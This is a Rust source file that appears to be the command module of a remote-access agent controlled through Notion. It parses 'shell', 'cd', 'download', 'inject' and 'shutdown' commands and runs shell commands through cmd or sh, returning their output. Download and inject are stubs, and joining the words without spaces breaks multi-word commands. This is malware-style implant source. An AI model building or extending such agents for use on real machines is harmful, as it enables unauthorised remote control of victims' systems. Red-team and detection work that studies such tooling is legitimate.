use std::error::Error;
use std::result::Result;
use std::fmt;
use std::path::Path;
use std::env::{set_current_dir, current_dir};
use std::process::Command;

pub enum CommandType {
    Cd(String),
    Shell(String),
    Download(String),
    Inject(String),
    Shutdown,
    Unknown
}
#[derive(Debug)]
struct CommandError(String);

impl fmt::Display for CommandError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl Error for CommandError {}

pub struct NotionCommand {
    pub commmand_type: CommandType,
}

impl NotionCommand {
    pub fn from_string(command_str: String) -> Result<NotionCommand, Box <dyn Error>> {
        let mut command_words = command_str.split(" ");
        // Taking the first command advances the iterator, so the remaining 
        // items should be the command data.
        // The call to this function clears the target emoji
        // TODO: Maybe do that here?
        if let Some(t) = command_words.nth(0) {
            let command_string = String::from(
                command_words.collect::<Vec<&str>>()
                .as_slice()
                .join::<&str>("")
            );
            let command_type: CommandType = match t {
                "shell"    => CommandType::Shell(command_string),
                "cd"       => CommandType::Cd(command_string),
                "download" => CommandType::Download(command_string),
                "inject"   => CommandType::Inject(command_string),
                "shutdown" => CommandType::Shutdown,
                _          => CommandType::Unknown
            };
            return Ok(NotionCommand { commmand_type:command_type});

        } else {
            return Err(Box::new(CommandError("Could not parse command!".to_string())));
        }
    }

    pub async fn handle(&self) -> Result<String, Box <dyn Error>> {
        match &self.commmand_type {
            CommandType::Cd(s) => {
                let new_path = Path::new(&s);
                set_current_dir(new_path).unwrap();

                return Ok(
                    String::from(current_dir()?
                    .to_str()
                    .unwrap())
                );
            },
            CommandType::Shell(s) => {
                let output = if cfg!(target_os = "windows") {
                    Command::new("cmd")
                        .args(["/c", s.as_str()])
                        .output()
                        .expect("failed to execute process")
                } else {
                    Command::new("sh")
                        .arg("-c")
                        .arg(s)
                        .output()
                        .expect("failed to execute process")
                };
                let output_string: String;
                if output.stderr.len() > 0 {
                    output_string = String::from_utf8(output.stderr).unwrap();
                } else {
                    output_string = String::from_utf8(output.stdout).unwrap();
                }
                return Ok(output_string);
            },
            CommandType::Download(s) => {
                return Ok(String::from("Not yet implemented!"));
            },
            CommandType::Inject(_) => {
                return Ok(String::from("Not yet implemented!"));
            },
            CommandType::Shutdown => {
                return Ok(String::from("Shutting down"));
            },
            CommandType::Unknown => {
                return Ok(String::from("Unknown command type"));
            }
        }
    }
}